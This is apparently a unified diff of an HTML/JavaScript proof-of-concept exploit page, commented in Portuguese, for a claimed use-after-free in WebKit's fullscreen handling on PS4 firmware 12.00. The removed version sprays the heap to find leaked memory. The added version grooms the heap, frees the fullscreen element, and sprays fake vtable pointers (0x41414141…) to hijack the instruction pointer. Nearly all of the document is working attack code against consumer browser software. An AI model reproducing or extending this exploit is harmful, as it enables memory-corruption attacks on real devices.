@@ -2,111 +2,73 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - ArrayBuffer Overlap Leak</title>
+<title>PS4 12.00 WebKit UAF - RIP Control PoC</title>
 <style>
-    body { font-family: monospace; background-color: #111; color: #0f0; padding: 20px; font-size: 16px;}
-    #log { margin-top: 20px; white-space: pre-wrap; }
-    .leak { color: #ff00ff; font-weight: bold; font-size: 20px;}
+    body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+    button { padding: 20px; font-size: 18px; font-weight: bold; background-color: #cc0000; color: white; border: none; cursor: pointer; }
 </style>
 </head>
 <body>
 
-<h2>PS4 12.00 - Info Leak via Overlap</h2>
-<button onclick="runTest()" style="padding: 15px; font-size: 16px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0;">Iniciar Varredura de Heap</button>
-<div id="log">Aguardando...</div>
+<h2>WebKit FullscreenManager UAF (Firmware 12.00)</h2>
+<button onclick="triggerPoC()">Trigger UAF & Hijack VTable</button>
+<p id="log">Aguardando...</p>
 
 <script>
-// Usaremos um marcador bem óbvio em hexadecimal: 0xBBBBBBBB (3149642683 em decimal)
-const MARKER = 3149642683; 
+// Representação em Float64 do valor hexadecimal 0x4141414141414141
+// O WebCore tentará dereferenciar isso como um ponteiro de VTable.
+const POINTER_HIJACK_PATTERN = 2.121995791e-314; 
 
-function runTest() {
-    const log = document.getElementById("log");
-    log.innerHTML = "Preparando alocações...<br><b>Pressione OPTIONS agora!</b>";
+function triggerPoC() {
+    document.getElementById("log").innerText = "Preparando a memória...\nPressione OPTIONS no controle do PS4.";
 
-    let controllers = [];
+    let keepAlive = [];
 
-    // Passo 1: Heap Grooming
+    // [1] Heap Grooming: Preparamos buracos contíguos no bmalloc
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
-        controllers.push(arr);
+        keepAlive.push(arr);
     }
 
+    // [2] Criação do Alvo: Elemento isolado para o Fullscreen
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Buscando Overlap...<br>Aperte OPTIONS</h1>";
-    fsTarget.style.backgroundColor = "black";
-    fsTarget.style.width = "100%";
-    fsTarget.style.height = "100%";
-    fsTarget.style.position = "absolute";
-    fsTarget.style.top = "0";
-    fsTarget.style.left = "0";
+    fsTarget.style.cssText = "position:absolute; top:0; left:0; width:100%; height:100%; background:black;";
     document.body.appendChild(fsTarget);
 
+    // Entramos em Fullscreen. O FullscreenManager em C++ agora guarda um ponteiro para fsTarget.
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
     }
 
     window.onblur = function() {
-        log.innerHTML += "<br>[*] Foco perdido. Removendo elemento (Free)...";
+        document.getElementById("log").innerText = "Evento onblur disparado. Iniciando corrupção...";
 
-        // Força GC para limpar o fsTarget
-        controllers = null;
+        // [3] Força a Coleta de Lixo para limpar o Heap
+        keepAlive = null;
         for (let i = 0; i < 20000; i++) {
             new ArrayBuffer(0x10000);
         }
 
-        // Gatilho do UAF
+        // [4] O Gatilho do UAF: Removemos o hospedeiro da tela cheia do DOM.
+        // O DOM limpa suas referências, mas o FullscreenManager retém o "dangling pointer".
         fsTarget.remove(); 
         
-        log.innerHTML += "<br>[*] Substituindo memória com Uint32Arrays (Spray)...";
-        
-        // NOVO SPRAY: Em vez de Float64 puros, usamos Uint32Array reais
+        // [5] Heap Spray: Substituímos o objeto C++ deletado pelo nosso padrão de ponteiro.
         let spray = [];
         for(let i = 0; i < 10000; i++) {
-            // Arrays com 16 slots (64 bytes), tamanho comum de objetos de Renderização
-            let p = new Uint32Array(16); 
-            p.fill(MARKER);
+            let p = new Float64Array(10);
+            p.fill(POINTER_HIJACK_PATTERN);
             spray.push(p);
         }
 
-        // Esperamos um instante para o WebKit "respirar" e atualizar os ponteiros internos
+        // [6] Execução da Falha: Ao tentar sair do modo Fullscreen, o motor WebCore
+        // acessará o ponteiro retido, lerá o nosso 0x41414141 como VTable e tentará executar
+        // o callback de saída. Resultado: Segfault (Controle de RIP/PC).
         setTimeout(() => {
-            log.innerHTML += "<br>[*] Varrendo ArrayBuffers em busca de corrupção...";
-            
-            let leakEncontrado = false;
-
-            // Inspecionamos todos os nossos Arrays
-            for (let i = 0; i < spray.length; i++) {
-                for (let j = 0; j < spray[i].length; j++) {
-                    let valor = spray[i][j];
-                    
-                    // Se o valor não for o nosso MARKER, o WebKit escreveu por cima!
-                    if (valor !== MARKER) {
-                        log.innerHTML += `<br><span class="leak">[!!!] OVERLAP DETECTADO no Array [${i}], Índice [${j}]!</span>`;
-                        log.innerHTML += `<br><span class="leak">[!!!] Valor vazado: 0x${valor.toString(16).padStart(8, '0')}</span>`;
-                        leakEncontrado = true;
-                        
-                        // Quebra o loop interno para não flodar a tela
-                        break; 
-                    }
-                }
-                if (leakEncontrado) break;
+            if (document.webkitIsFullScreen || document.fullscreenElement) {
+                document.webkitExitFullscreen?.();
             }
-
-            if (!leakEncontrado) {
-                log.innerHTML += `<br>[-] Nenhum dado C++ vazado nos buffers. A memória permaneceu intacta.`;
-            }
-
-            log.innerHTML += `<br>[*] Forçando a saída do Fullscreen para verificar controle de PC...`;
-            
-            // Agora chamamos a saída do fullscreen. 
-            // Se der tela azul, significa que o WebKit LEU o nosso MARKER e tentou pular para o endereço 0xBBBBBBBB!
-            setTimeout(() => {
-                if (document.webkitIsFullScreen || document.fullscreenElement) {
-                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
-                }
-            }, 2000);
-
         }, 1500);
     };
 }
